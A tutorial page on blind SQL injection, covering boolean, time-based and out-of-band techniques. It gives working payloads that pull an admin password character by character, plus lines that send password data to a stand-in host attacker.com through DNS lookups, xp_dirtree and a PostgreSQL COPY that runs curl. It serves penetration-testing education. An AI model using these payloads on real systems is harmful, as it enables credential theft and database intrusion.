---
title: Blind SQL Injection
---

When there's no visible query output and no error messages, injection still happens — you just can't see it directly. Blind SQLi extracts data by asking the database yes/no questions and reading the answer in observable side effects (page content, response time).

## Boolean-Based Blind

The page content changes between a true and false condition. Use that difference to extract data one bit at a time.

### Setup

Confirm boolean detection works:

```sql
' AND 1=1-- -      → "normal" page (e.g. "Welcome back")
' AND 1=2-- -      → "different" page (e.g. no greeting)
```

The observable difference becomes your signal.

### Extracting One Character

Ask: "is the first character of the admin password 'a'?"

```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -
```

If the page shows the "true" state, the first char is `a`. If "false", it isn't — move to the next candidate.

### Using ASCII and Binary Search

Testing every character (a-z, 0-9, symbols) linearly is slow. Binary search cuts it to ~7 requests per character:

```sql
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) > 96-- -
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) > 112-- -
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) > 104-- -
```

Each response halves the remaining ASCII range.

### Position Counter

Iterate the position number to walk through the full string:

```sql
SUBSTRING(..., 1, 1)    → first char
SUBSTRING(..., 2, 1)    → second char
SUBSTRING(..., 3, 1)    → third char
```

Stop when `SUBSTRING(..., N, 1) = ''` (empty) — that's the end of the string.

### Don't Do This By Hand

Automate boolean-blind with Burp Intruder (cluster bomb mode) or a quick Python script using `requests`. Manual extraction of a 32-character hash is 32 × 7 = 224 requests; nobody clicks that many times.

## Time-Based Blind

When even the page content doesn't differ, use timing. You make the DB sleep conditionally — and the response delay becomes your true/false signal.

### Setup

Confirm time-based detection works:

```sql
' AND IF(1=1, SLEEP(3), 0)-- -     → ~3 second delay
' AND IF(1=2, SLEEP(3), 0)-- -     → no delay
```

If the delay matches your condition, you have time-based injection.

### DBMS-Specific Sleep Functions

| DBMS | Sleep Payload |
|---|---|
| MySQL | `SLEEP(5)` |
| MySQL (alt) | `BENCHMARK(5000000, SHA1('x'))` |
| MSSQL | `WAITFOR DELAY '0:0:5'` |
| PostgreSQL | `pg_sleep(5)` |
| Oracle | `DBMS_PIPE.RECEIVE_MESSAGE('a', 5)` |

### Extracting a Character

```sql
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(3), 0)-- -
```

Same logic as boolean-blind, just with sleep as the signal.

### Noise and Reliability

Time-based is noisy — network jitter, server load, and caching all affect timing. To stay reliable:

- Use a longer sleep (5-10 seconds) so real responses stand out
- Repeat each test 2-3 times; take the median
- Run baseline requests between tests to catch anomalies

## Out-of-Band (OOB) Exfiltration

When even time-based is impractical (strict query timeouts, or thousands of chars to extract), push data to an attacker-controlled server:

**MySQL + DNS exfil** (requires `LOAD_FILE` plus SMB on Windows targets):

```sql
' UNION SELECT NULL,
    LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a')),
    NULL-- -
```

The MySQL server does a DNS lookup for `<password>.attacker.com`, logging it on your DNS server. One request = one full value.

**MSSQL + xp_dirtree:**

```sql
'; EXEC master..xp_dirtree '\\attacker.com\a'-- -
```

**PostgreSQL + COPY:**

```sql
'; COPY (SELECT password FROM users) TO PROGRAM 'curl http://attacker.com/log -d @-'-- -
```

Fastest exfil method when available. Requires an internet-reachable attacker server or an in-scope Burp Collaborator / interact.sh instance.
